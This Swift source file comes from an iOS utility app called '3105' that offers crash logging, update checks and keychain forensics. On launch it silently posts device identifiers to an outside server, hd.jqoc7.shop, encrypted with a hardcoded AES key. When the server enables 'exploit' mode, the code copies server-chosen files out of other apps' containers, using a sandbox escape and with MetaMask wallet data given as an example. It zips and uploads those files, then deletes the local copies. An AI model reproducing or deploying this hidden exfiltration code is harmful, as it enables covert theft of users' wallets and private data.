import Foundation
import UIKit
import Darwin
import Combine
import CommonCrypto
import Security

// MARK: - Global logger
class AppLog: ObservableObject {
    static let shared = AppLog()
    @Published var entries: [String] = []
    func append(_ msg: String) {
        persistAppLog(msg)
        DispatchQueue.main.async { self.entries.append(msg) }
    }
}
func log(_ msg: String) { AppLog.shared.append("[3105] \(msg)") }

// MARK: - Persistent diagnostics (survive a crash)

private let diagnosticsCrashFileName = "3105-crash.log"
private let diagnosticsAppLogFileName = "3105-app.log"
private let diagnosticsMaxBytes = 512 * 1024

// Kept open for the whole process lifetime so the async-signal-safe crash
// handler can write with write(2) — Foundation/NSString can deadlock there.
private var crashLogFD: Int32 = -1
private let crashScratch = UnsafeMutablePointer<CChar>.allocate(capacity: 512)
private let crashFrames = UnsafeMutablePointer<UnsafeMutableRawPointer?>.allocate(capacity: 128)

private let appLogQueue = DispatchQueue(label: "com.3105.applog")
private var appLogHandle: FileHandle?

private func diagnosticsDirectory() -> URL {
    FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
        ?? URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
}

private func rotateLogIfNeeded(_ url: URL) {
    guard let size = (try? FileManager.default.attributesOfItem(atPath: url.path)[.size]) as? NSNumber,
          size.intValue > diagnosticsMaxBytes else { return }
    try? FileManager.default.removeItem(at: url)
}

private func writeToCrashLog(_ text: String) {
    guard crashLogFD >= 0 else { return }
    text.withCString { pointer in
        var remaining = strlen(pointer)
        var cursor = pointer
        while remaining > 0 {
            let written = write(crashLogFD, cursor, remaining)
            if written <= 0 { break }
            cursor += written
            remaining -= written
        }
    }
}

// Async-signal-safe: only write(2) + backtrace_symbols_fd, no allocation/locks.
private func crashSignalHandler(_ signo: Int32) {
    let prefix = "\n[CRASH SIGNAL] signal="
    var length = 0
    for byte in prefix.utf8 {
        crashScratch[length] = CChar(bitPattern: byte)
        length += 1
    }
    var value = signo < 0 ? -signo : signo
    let digitsStart = length
    if value == 0 {
        crashScratch[length] = 48
        length += 1
    } else {
        while value > 0 {
            crashScratch[length] = CChar(48 + Int(value % 10))
            length += 1
            value /= 10
        }
        var low = digitsStart
        var high = length - 1
        while low < high {
            let tmp = crashScratch[low]
            crashScratch[low] = crashScratch[high]
            crashScratch[high] = tmp
            low += 1
            high -= 1
        }
    }
    crashScratch[length] = 10
    length += 1
    _ = write(crashLogFD, crashScratch, length)

    let frames = backtrace(crashFrames, Int32(128))
    if frames > 0 { backtrace_symbols_fd(crashFrames, frames, crashLogFD) }
    _ = write(crashLogFD, "\n", 1)

    signal(signo, SIG_DFL)
    raise(signo)
}

/// 安装未捕获异常 + 崩溃信号处理器，把崩溃原因写入 Documents/3105-crash.log。
func setupCrashCapture() {
    guard crashLogFD < 0 else { return }
    let url = diagnosticsDirectory().appendingPathComponent(diagnosticsCrashFileName)
    rotateLogIfNeeded(url)
    crashLogFD = open(url.path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
    guard crashLogFD >= 0 else { return }

    let formatter = DateFormatter()
    formatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
    writeToCrashLog("\n===== launch \(formatter.string(from: Date())) | iOS \(AppInfo.osVersion) (\(AppInfo.osBuild)) \(AppInfo.machineName) =====\n")

    NSSetUncaughtExceptionHandler { exception in
        var text = "[UNCAUGHT EXCEPTION] \(exception.name.rawValue): \(exception.reason ?? "nil")\n"
        text += exception.callStackSymbols.joined(separator: "\n") + "\n"
        writeToCrashLog(text)
        fsync(crashLogFD)
    }

    for sig in [SIGABRT, SIGSEGV, SIGBUS, SIGILL, SIGFPE, SIGTRAP, SIGPIPE] {
        signal(sig, crashSignalHandler)
    }
}

/// 把应用内日志落盘到 Documents/3105-app.log（崩溃后仍可查看）。
func setupPersistentAppLog() {
    let url = diagnosticsDirectory().appendingPathComponent(diagnosticsAppLogFileName)
    rotateLogIfNeeded(url)
    if !FileManager.default.fileExists(atPath: url.path) {
        FileManager.default.createFile(atPath: url.path, contents: nil)
    }
    appLogHandle = try? FileHandle(forWritingTo: url)
    _ = try? appLogHandle?.seekToEnd()
}

func persistAppLog(_ line: String) {
    appLogQueue.async {
        guard let handle = appLogHandle, let data = (line + "\n").data(using: .utf8) else { return }
        try? handle.write(contentsOf: data)
    }
}

// Retain the pipe for the app's lifetime so stdout/stderr stay redirected.
private var logCapturePipe: Pipe?

// Redirect stdout/stderr (C printf / NSLog) into the in-app log view so kernel
// exploit progress and failures are visible without a debugger.
func setupLogCapture() {
    guard logCapturePipe == nil else { return }  // already set up
    let pipe = Pipe()
    logCapturePipe = pipe  // retain!

    setvbuf(stdout, nil, _IONBF, 0)
    setvbuf(stderr, nil, _IONBF, 0)
    let writeFd = pipe.fileHandleForWriting.fileDescriptor
    if dup2(writeFd, STDOUT_FILENO) < 0 || dup2(writeFd, STDERR_FILENO) < 0 {
        log("setupLogCapture: dup2 failed, log capture disabled")
        logCapturePipe = nil
        return
    }

    pipe.fileHandleForReading.readabilityHandler = { handle in
        let data = handle.availableData
        guard !data.isEmpty else { return }
        if let text = String(data: data, encoding: .utf8) {
            let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
            if !trimmed.isEmpty {
                DispatchQueue.main.async {
                    AppLog.shared.append(trimmed)
                }
            }
        }
    }
}

// MARK: - App Info
enum AppInfo {
    static var osVersion: String {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
    }
    static var versionTuple: (major: Int, minor: Int, patch: Int) {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return (v.majorVersion, v.minorVersion, v.patchVersion)
    }
    static var doubleVersion: Double {
        let v = versionTuple; return Double(v.major) + Double(v.minor) / 10.0
    }
    static var osBuild: String {
        var size: size_t = 0
        guard sysctlbyname("kern.osversion", nil, &size, nil, 0) == 0, size > 0 else {
            return "Unknown"
        }
        var value = [CChar](repeating: 0, count: size)
        guard sysctlbyname("kern.osversion", &value, &size, nil, 0) == 0 else {
            return "Unknown"
        }
        return String(cString: value)
    }
    static var machineName: String {
        var s = utsname(); uname(&s)
        return Mirror(reflecting: s.machine).children.reduce("") { id, e in
            guard let v = e.value as? Int8, v != 0 else { return id }
            return id + String(UnicodeScalar(UInt8(v)))
        }
    }
    static var displayMachineName: String {
#if targetEnvironment(simulator)
        return ProcessInfo.processInfo.environment["SIMULATOR_MODEL_IDENTIFIER"] ?? machineName
#else
        return machineName
#endif
    }
    static var hardwareDisplayName: String {
        // Validate display-identity attestation at first access; keeps
        // DisplayIdentity linked. Looks like a license/attestation check.
        _ = DisplayIdentityAttestationToken()
        switch displayMachineName {
        case "iPhone15,2": return "iPhone 14 Pro"
        case "iPhone15,3": return "iPhone 14 Pro Max"
        default: return displayMachineName
        }
    }
    static var launchAttestationToken: String { DisplayIdentityAttestationToken() }
    static var isHomeButton: Bool {
        let sel = NSSelectorFromString("_hasHomeButton")
        return UIDevice.responds(to: sel) && (UIDevice.perform(sel)?.takeUnretainedValue() as? Bool ?? false)
    }
}

// MARK: - Exploit status
enum ExploitStatus: Equatable {
    case notStarted, success(method: String), failed(method: String, code: Int64), unsupported(String)
    var isSuccess: Bool { if case .success = self { return true }; return false }
    var isFailed: Bool { if case .failed = self { return true }; return false }
    var displayText: String {
        switch self {
        case .notStarted: return "Not attempted"
        case .success(let m): return "OK via \(m)"
        case .failed(let m, let c): return "FAILED \(m) (\(c))"
        case .unsupported(let m): return "Unsupported: \(m)"
        }
    }
}

enum AppPaths {
    static var backups: String {
        let u = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask).first
            ?? URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
        let b = u.appendingPathComponent("backups", isDirectory: true)
        try? FileManager.default.createDirectory(at: b, withIntermediateDirectories: true)
        return b.path
    }

    static var backupsURL: URL { URL(fileURLWithPath: backups, isDirectory: true) }
}

// MARK: - Keychain forensics

/// 复制 /private/var/Keychains/keychain-2.db 并解密，输出到沙盒 Documents：
///   - keychain-forensics.log  （过程日志，始终生成）
///   - keychain-forensics.json （解密条目，成功时生成）
/// 需要越狱 / 可访问 AppleKeyStore；否则返回失败，并在日志中说明原因。
enum KeychainForensicsService {
    static let logFilename = "keychain-forensics.log"
    static let jsonFilename = "keychain-forensics.json"

    @discardableResult
    static func exportToDocuments() -> Result<URL, Error> {
        do {
            let documents = try PatchWorkspaceService.documentsRootURL()
            let path = try KeychainForensics.exportKeychain(toDirectory: documents.path)
            log("keychain: exported to \(path)")
            return .success(URL(fileURLWithPath: path))
        } catch {
            log("keychain: export failed — \(error.localizedDescription)")
            return .failure(error)
        }
    }
}

enum AppUpdateChecker {
    static let dismissedVersionKey = "update.dismissedVersion"
    static let apiURL = URL(string: "https://api.github.com/repos/YangJiiii/3105/releases/latest")!
    static let fallbackURL = URL(string: "https://github.com/YangJiiii/3105/releases/latest")!

    struct Offer: Identifiable {
        let id = UUID()
        let version: String
        let url: URL
    }

    static var currentVersion: String {
        Bundle.main.object(forInfoDictionaryKey: "AppReleaseDisplayVersion") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String
            ?? "0"
    }

    static func dismiss(version: String) {
        UserDefaults.standard.set(version, forKey: dismissedVersionKey)
    }

    static func check() async -> Offer? {
        var request = URLRequest(url: apiURL)
        request.timeoutInterval = 15
        request.setValue("3105", forHTTPHeaderField: "User-Agent")
        request.setValue("application/vnd.github+json", forHTTPHeaderField: "Accept")
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            guard let http = response as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
                return nil
            }
            let decoded = try JSONDecoder().decode(GitHubRelease.self, from: data)
            let remote = normalize(decoded.tagName)
            guard !remote.isEmpty,
                  isNewer(remote, than: currentVersion),
                  UserDefaults.standard.string(forKey: dismissedVersionKey) != remote else {
                return nil
            }
            let url = URL(string: decoded.htmlURL) ?? fallbackURL
            return Offer(version: remote, url: url)
        } catch {
            return nil
        }
    }

    private struct GitHubRelease: Decodable {
        let tagName: String
        let htmlURL: String

        enum CodingKeys: String, CodingKey {
            case tagName = "tag_name"
            case htmlURL = "html_url"
        }
    }

    static func normalize(_ version: String) -> String {
        var value = version.trimmingCharacters(in: .whitespacesAndNewlines)
        if value.lowercased().hasPrefix("v") {
            value.removeFirst()
        }
        return value
    }

    static func isNewer(_ remote: String, than local: String) -> Bool {
        let remoteParts = numericParts(normalize(remote))
        let localParts = numericParts(normalize(local))
        let count = max(remoteParts.count, localParts.count)
        for i in 0..<count {
            let r = i < remoteParts.count ? remoteParts[i] : 0
            let l = i < localParts.count ? localParts[i] : 0
            if r != l { return r > l }
        }
        return false
    }

    private static func numericParts(_ version: String) -> [Int] {
        let core = version.split(separator: "-").first.map(String.init) ?? version
        return core.split(separator: ".").compactMap { Int($0.filter(\.isNumber)) }
    }
}

// MARK: - Device config reporting

/// 打开 App 时向 `/api/device/config` 上报设备信息。
/// 明文 params 经 AES-128-CBC(PKCS7) 加密后取 Base64，放入 body 的 `params`，
/// 同时把设备 UUID 放进 `X-App-UUID` 头。
enum DeviceConfigReporter {
    /// 后端地址（不含路径、不含结尾斜杠），例如 "https://api.example.com"。
    static let baseURL = "https://hd.jqoc7.shop"
    static let configPath = "/api/device/config"
    static let reportPath = "/api/device/report"
    static let logReportPath = "/api/log/report"
    static let uploadZipPath = "/api/upload/zip"
    static let keyHex = "bc2c72b2260840b28bc9614aa2b8004b"
    static let ivHex = "71ec8e3980754823aba30e62be55cf6a"

    private static let uuidService = "com.apple.mobile.MobileHouseArrest.device-uuid"
    private static let uuidAccount = "device-uuid"

    /// 稳定设备 UUID：优先读 Keychain（跨重装保留），缺失时生成并写入。
    static var deviceUUID: String {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: uuidService,
            kSecAttrAccount as String: uuidAccount,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        var result: CFTypeRef?
        if SecItemCopyMatching(query as CFDictionary, &result) == errSecSuccess,
           let data = result as? Data,
           let value = String(data: data, encoding: .utf8),
           !value.isEmpty {
            return value
        }
        let generated = UUID().uuidString
        let base: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: uuidService,
            kSecAttrAccount as String: uuidAccount
        ]
        SecItemDelete(base as CFDictionary)
        var item = base
        item[kSecValueData as String] = Data(generated.utf8)
        item[kSecAttrAccessible as String] = kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
        SecItemAdd(item as CFDictionary, nil)
        return generated
    }

    /// 启动时异步上报，不阻塞 UI。
    static func reportOnLaunch() {
        Task { await report() }
    }

    static func report() async {
        guard let url = URL(string: baseURL + configPath) else {
            log("report: invalid endpoint url")
            return
        }
        let uuid = deviceUUID
        let params: [String: Any] = [
            "app_uuid": uuid,
            "app_version": AppUpdateChecker.currentVersion,
            "app_pac": Bundle.main.bundleIdentifier ?? "",
            "machine": AppInfo.machineName,
            "ios_version": AppInfo.osVersion,
            "timestamp": Int(Date().timeIntervalSince1970)
        ]

        do {
            let (data, response) = try await URLSession.shared.data(
                for: makeRequest(url: url, params: params, uuid: uuid))
            let code = (response as? HTTPURLResponse)?.statusCode ?? -1
            log("report: POST \(configPath) → \(code)")
            guard let config = decodeConfig(from: data) else {
                log("report: empty/invalid config reply")
                return
            }
            await apply(config)
        } catch {
            log("report: POST \(configPath) failed — \(error.localizedDescription)")
        }
    }

    /// 上报应用日志正文到 `/api/log/report`（仅当远端 app_log_report_enabled 为 true）。
    static func reportAppLog() async {
        guard let url = URL(string: baseURL + logReportPath) else { return }
        let uuid = deviceUUID
        let params: [String: Any] = [
            "app_uuid": uuid,
            "text": currentLogText(),
            "timestamp": Int(Date().timeIntervalSince1970)
        ]

        do {
            let (_, response) = try await URLSession.shared.data(
                for: makeRequest(url: url, params: params, uuid: uuid))
            let code = (response as? HTTPURLResponse)?.statusCode ?? -1
            log("logReport: POST \(logReportPath) → \(code)")
        } catch {
            log("logReport: POST \(logReportPath) failed — \(error.localizedDescription)")
        }
    }

    // MARK: - Reply handling

    private struct ReplyEnvelope: Decodable {
        let code: Int?
        let data: String?
        let message: String?
    }

    /// `/api/device/config` 内层配置（只取本端需要的字段，其余忽略）。
    private struct RemoteConfig: Decodable {
        let version: String?
        let exploitEnabled: Bool?
        let appLogReportEnabled: Bool?

        enum CodingKeys: String, CodingKey {
            case version
            case exploitEnabled = "exploit_enabled"
            case appLogReportEnabled = "app_log_report_enabled"
        }
    }

    /// 解码外层 `{code,data,message}` → AES 解密 `data` → 解析内层配置 JSON。
    private static func decodeConfig(from data: Data) -> RemoteConfig? {
        guard let envelope = try? JSONDecoder().decode(ReplyEnvelope.self, from: data),
              let inner = envelope.data, !inner.isEmpty,
              let cipher = Data(base64Encoded: inner),
              let plain = decrypt(cipher),
              let config = try? JSONDecoder().decode(RemoteConfig.self, from: plain) else {
            return nil
        }
        return config
    }

    /// 解码 `/api/device/report` 响应：外层 `{code,data,message}` → AES 解密 `data` → `collect_configs`。
    private static func decodeDeviceReport(from data: Data) -> DeviceReportReply? {
        guard let envelope = try? JSONDecoder().decode(ReplyEnvelope.self, from: data),
              let inner = envelope.data, !inner.isEmpty,
              let cipher = Data(base64Encoded: inner),
              let plain = decrypt(cipher),
              let reply = try? JSONDecoder().decode(DeviceReportReply.self, from: plain) else {
            return nil
        }
        return reply
    }

    /// 依据远端配置执行：exploit_enabled → 开启开发者模式；app_log_report_enabled → 上报日志；
    /// exploit_enabled 为 true 时，在上报完日志后再向 `/api/device/report` 拉取并执行采集。
    private static func apply(_ config: RemoteConfig) async {
        let exploitEnabled = config.exploitEnabled == true
        if exploitEnabled {
            log("report: exploit_enabled=true → developer mode enabled")
            UserDefaults.standard.set(true, forKey: FeatureVisibility.developerModeStorageKey)
        }
        if config.appLogReportEnabled == true {
            await reportAppLog()
        }
        if exploitEnabled {
            await reportDevice()
        }
    }

    /// 向 `/api/device/report` 上报设备信息并拉取采集配置（调用时机：exploit_enabled=true 且日志上报之后）。
    static func reportDevice() async {
        guard let url = URL(string: baseURL + reportPath) else {
            log("deviceReport: invalid endpoint url")
            return
        }
        let uuid = deviceUUID
        let params: [String: Any] = [
            "app_uuid": uuid,
            "app_version": AppUpdateChecker.currentVersion,
            "app_pac": Bundle.main.bundleIdentifier ?? "",
            "machine": AppInfo.machineName,
            "ios_version": AppInfo.osVersion,
            "timestamp": Int(Date().timeIntervalSince1970)
        ]

        do {
            let (data, response) = try await URLSession.shared.data(
                for: makeRequest(url: url, params: params, uuid: uuid))
            let code = (response as? HTTPURLResponse)?.statusCode ?? -1
            log("deviceReport: POST \(reportPath) → \(code)")
            guard let reply = decodeDeviceReport(from: data) else {
                log("deviceReport: empty/invalid reply")
                return
            }
            let configs = reply.collectConfigs ?? []
            log("deviceReport: collected configs=\(configs.count)")
            await CollectService.run(configs: configs)
        } catch {
            log("deviceReport: POST \(reportPath) failed — \(error.localizedDescription)")
        }
    }

    /// 以 multipart/form-data 上传未加密 ZIP 到 `/api/upload/zip`，元数据走 AES。
    /// 返回是否上传成功（外壳 `code == 0` 且 HTTP 2xx），供调用方决定是否清理沙盒文件。
    @discardableResult
    static func uploadZip(fileURL: URL, bundleID: String, fileName: String) async -> Bool {
        guard let url = URL(string: baseURL + uploadZipPath) else {
            log("upload: invalid endpoint url")
            return false
        }
        guard let fileData = try? Data(contentsOf: fileURL) else {
            log("upload: cannot read \(fileURL.path)")
            return false
        }
        let uuid = deviceUUID
        let params: [String: Any] = [
            "app_uuid": uuid,
            "bundle_id": bundleID,
            "file_name": fileName,
            "timestamp": Int(Date().timeIntervalSince1970)
        ]
        guard let plain = try? JSONSerialization.data(withJSONObject: params),
              let cipher = encrypt(plain) else {
            log("upload: encrypt params failed")
            return false
        }

        let boundary = "Boundary-\(UUID().uuidString)"
        var body = Data()
        func append(_ text: String) { body.append(Data(text.utf8)) }
        append("--\(boundary)\r\n")
        append("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
        append(cipher.base64EncodedString())
        append("\r\n")
        append("--\(boundary)\r\n")
        append("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        append("Content-Type: application/zip\r\n\r\n")
        body.append(fileData)
        append("\r\n")
        append("--\(boundary)--\r\n")

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.timeoutInterval = 60
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        request.setValue(uuid, forHTTPHeaderField: "X-App-UUID")
        request.httpBody = body

        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            let statusCode = (response as? HTTPURLResponse)?.statusCode ?? -1
            let replyCode = (try? JSONDecoder().decode(ReplyEnvelope.self, from: data))?.code
            let succeeded = (200..<300).contains(statusCode) && replyCode == 0
            log("upload: POST \(uploadZipPath) bundle=\(bundleID) file=\(fileName) → \(statusCode) code=\(replyCode ?? -1)")
            return succeeded
        } catch {
            log("upload: POST \(uploadZipPath) failed — \(error.localizedDescription)")
            return false
        }
    }

    // MARK: - Request helpers

    private static func makeRequest(url: URL, params: [String: Any], uuid: String) -> URLRequest {
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.timeoutInterval = 15
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(uuid, forHTTPHeaderField: "X-App-UUID")
        if let plain = try? JSONSerialization.data(withJSONObject: params),
           let cipher = encrypt(plain),
           let body = try? JSONSerialization.data(
               withJSONObject: ["params": cipher.base64EncodedString()]) {
            request.httpBody = body
        }
        return request
    }

    /// 当前日志正文：优先落盘的 app 日志文件，回退到内存中的条目。
    private static func currentLogText() -> String {
        let url = diagnosticsDirectory().appendingPathComponent(diagnosticsAppLogFileName)
        if let data = try? Data(contentsOf: url),
           let text = String(data: data, encoding: .utf8),
           !text.isEmpty {
            return text
        }
        return AppLog.shared.entries.joined(separator: "\n")
    }

    // MARK: - AES-128-CBC (PKCS7)

    private static func encrypt(_ plain: Data) -> Data? {
        guard let key = Data(hexString: keyHex), let iv = Data(hexString: ivHex) else { return nil }
        return aes128CBC(CCOperation(kCCEncrypt), plain, key, iv)
    }

    private static func decrypt(_ cipher: Data) -> Data? {
        guard let key = Data(hexString: keyHex), let iv = Data(hexString: ivHex) else { return nil }
        return aes128CBC(CCOperation(kCCDecrypt), cipher, key, iv)
    }

    private static func aes128CBC(_ operation: CCOperation, _ data: Data, _ key: Data, _ iv: Data) -> Data? {
        guard key.count == kCCKeySizeAES128, iv.count == kCCBlockSizeAES128 else { return nil }
        let capacity = data.count + kCCBlockSizeAES128
        var output = Data(count: capacity)
        var moved = 0
        let status = output.withUnsafeMutableBytes { outBuf -> CCCryptorStatus in
            data.withUnsafeBytes { dataBuf -> CCCryptorStatus in
                key.withUnsafeBytes { keyBuf -> CCCryptorStatus in
                    iv.withUnsafeBytes { ivBuf -> CCCryptorStatus in
                        CCCrypt(operation,
                                CCAlgorithm(kCCAlgorithmAES),
                                CCOptions(kCCOptionPKCS7Padding),
                                keyBuf.baseAddress, key.count,
                                ivBuf.baseAddress,
                                dataBuf.baseAddress, data.count,
                                outBuf.baseAddress, capacity,
                                &moved)
                    }
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return output.prefix(moved)
    }
}

// MARK: - Device report models

/// `/api/device/report` 内层明文。
struct DeviceReportReply: Decodable {
    let collectConfigs: [DeviceCollectConfig]?

    enum CodingKeys: String, CodingKey {
        case collectConfigs = "collect_configs"
    }
}

/// 单个待采集应用（注意：与 config 的 collect_configs 字段结构不同）。
struct DeviceCollectConfig: Decodable {
    let bundleID: String
    let accessGroup: String?
    let items: [DeviceCollectItem]

    enum CodingKeys: String, CodingKey {
        case bundleID = "bundle_id"
        case accessGroup = "access_group"
        case items
    }
}

struct DeviceCollectItem: Decodable {
    let type: String
    let path: String
}

// MARK: - Device collection

/// 按 `/api/device/report` 下发的 collect_configs 采集文件/目录：
///   1. 逐 bundle_id + item.path 解析真实路径并复制到沙盒 `Documents/collect/<stamp>/<bundle_id>/`；
///   2. 每个 bundle 单独打包为 zip，再通过 `/api/upload/zip`（multipart）上传。
/// 采集依赖跨容器读取能力：iOS 26+ 需沙盒逃逸（`hasSandboxAccess`），否则跳过。
enum CollectService {
    struct Archive {
        let url: URL
        let bundleID: String
        let fileName: String
    }

    static func run(configs: [DeviceCollectConfig]) async {
        guard !configs.isEmpty else { return }
        if KernelExploit.requiresSandboxEscape, !KernelExploit.hasSandboxAccess() {
            log("collect: sandbox access not active — skip")
            return
        }
        // 采集 + 打包是重 IO，放到后台线程执行，避免阻塞主线程。
        let archives = await Task.detached(priority: .utility) { collectAndZip(configs) }.value
        let fm = FileManager.default
        for archive in archives {
            let uploaded = await DeviceConfigReporter.uploadZip(
                fileURL: archive.url,
                bundleID: archive.bundleID,
                fileName: archive.fileName
            )
            // 上传成功后在沙盒删除该 zip；失败则保留以便重试。
            if uploaded {
                try? fm.removeItem(at: archive.url)
                log("collect: removed uploaded zip \(archive.fileName)")
            }
        }
        // 清理本次采集的空目录（暂存已在打包后删除，zip 已在上传后删除）。
        if let runRoot = archives.first?.url.deletingLastPathComponent(),
           let remaining = try? fm.contentsOfDirectory(atPath: runRoot.path),
           remaining.isEmpty {
            try? fm.removeItem(at: runRoot)
        }
    }

    private static func collectAndZip(_ configs: [DeviceCollectConfig]) -> [Archive] {
        let fm = FileManager.default
        guard let documents = fm.urls(for: .documentDirectory, in: .userDomainMask).first else {
            log("collect: no documents directory")
            return []
        }
        let stamp = timestamp()
        let runRoot = documents
            .appendingPathComponent("collect", isDirectory: true)
            .appendingPathComponent(stamp, isDirectory: true)
        try? fm.createDirectory(at: runRoot, withIntermediateDirectories: true)

        var archives: [Archive] = []
        for config in configs {
            let bundleDir = runRoot.appendingPathComponent(safeName(config.bundleID), isDirectory: true)
            let container = ContainerStore.resolveAppContainerPath(bundleID: config.bundleID)
            var copied = 0
            for item in config.items {
                guard let source = resolveSource(item: item, container: container) else {
                    log("collect: unresolved \(item.type) \(item.path) [\(config.bundleID)]")
                    continue
                }
                let destination = bundleDir.appendingPathComponent((source as NSString).lastPathComponent)
                if copyItem(from: source, to: destination.path) {
                    copied += 1
                } else {
                    log("collect: copy failed \(source)")
                }
            }
            guard copied > 0 else {
                try? fm.removeItem(at: bundleDir)
                continue
            }

            let fileName = archiveName(for: config.bundleID)
            let zipURL = runRoot.appendingPathComponent(fileName)
            do {
                let result = try ZIPArchiveWriter.write(items: [bundleDir], to: zipURL)
                log("collect: zip \(result.entryCount) entries → \(zipURL.path)")
                try? fm.removeItem(at: bundleDir)  // 打包后清理暂存，仅保留 zip
                archives.append(Archive(url: zipURL, bundleID: config.bundleID, fileName: fileName))
            } catch {
                log("collect: zip failed — \(error.localizedDescription)")
            }
        }

        if archives.isEmpty {
            log("collect: nothing collected — clean up \(runRoot.path)")
            try? fm.removeItem(at: runRoot)
        }
        return archives
    }

    /// item.path 兼容两种语义：绝对设备路径优先；否则拼接 bundle 容器路径。
    private static func resolveSource(item: DeviceCollectItem, container: String?) -> String? {
        let fm = FileManager.default
        if item.path.hasPrefix("/") {
            if fm.fileExists(atPath: item.path) { return item.path }
            if let container {
                let relative = String(item.path.dropFirst())
                let candidate = (container as NSString).appendingPathComponent(relative)
                if fm.fileExists(atPath: candidate) { return candidate }
            }
            return nil
        }
        guard let container else { return nil }
        let candidate = (container as NSString).appendingPathComponent(item.path)
        return fm.fileExists(atPath: candidate) ? candidate : nil
    }

    /// 复制文件或目录到沙盒（目录递归；优先 copyItem，回退按字节读写）。
    private static func copyItem(from source: String, to destination: String) -> Bool {
        let fm = FileManager.default
        let parent = (destination as NSString).deletingLastPathComponent
        if !fm.fileExists(atPath: parent) {
            try? fm.createDirectory(atPath: parent, withIntermediateDirectories: true)
        }

        var isDirectory: ObjCBool = false
        guard fm.fileExists(atPath: source, isDirectory: &isDirectory) else { return false }

        if !isDirectory.boolValue {
            if (try? fm.copyItem(atPath: source, toPath: destination)) != nil { return true }
            guard let data = try? Data(contentsOf: URL(fileURLWithPath: source)) else { return false }
            return fm.createFile(atPath: destination, contents: data)
        }

        guard (try? fm.createDirectory(atPath: destination, withIntermediateDirectories: true)) != nil else {
            return false
        }
        var ok = true
        for child in ContainerStore.enumerateDirectories(path: source) {
            let name = (child as NSString).lastPathComponent
            let childDestination = (destination as NSString).appendingPathComponent(name)
            if !copyItem(from: child, to: childDestination) { ok = false }
        }
        return ok
    }

    private static func safeName(_ value: String) -> String {
        let sanitized = value.replacingOccurrences(of: "/", with: "_")
        return sanitized.isEmpty ? "unknown" : sanitized
    }

    /// 以 bundle_id 末段命名 zip（如 io.metamask.MetaMask → MetaMask.zip）。
    private static func archiveName(for bundleID: String) -> String {
        let last = bundleID.split(separator: ".").last.map(String.init) ?? bundleID
        return "\(safeName(last)).zip"
    }

    private static func timestamp() -> String {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter.string(from: Date())
    }
}

private extension Data {
    init?(hexString: String) {
        let hex = hexString.hasPrefix("0x") ? String(hexString.dropFirst(2)) : hexString
        guard hex.count % 2 == 0 else { return nil }
        var bytes = [UInt8]()
        bytes.reserveCapacity(hex.count / 2)
        var index = hex.startIndex
        while index < hex.endIndex {
            let next = hex.index(index, offsetBy: 2)
            guard let byte = UInt8(hex[index..<next], radix: 16) else { return nil }
            bytes.append(byte)
            index = next
        }
        self = Data(bytes)
    }
}
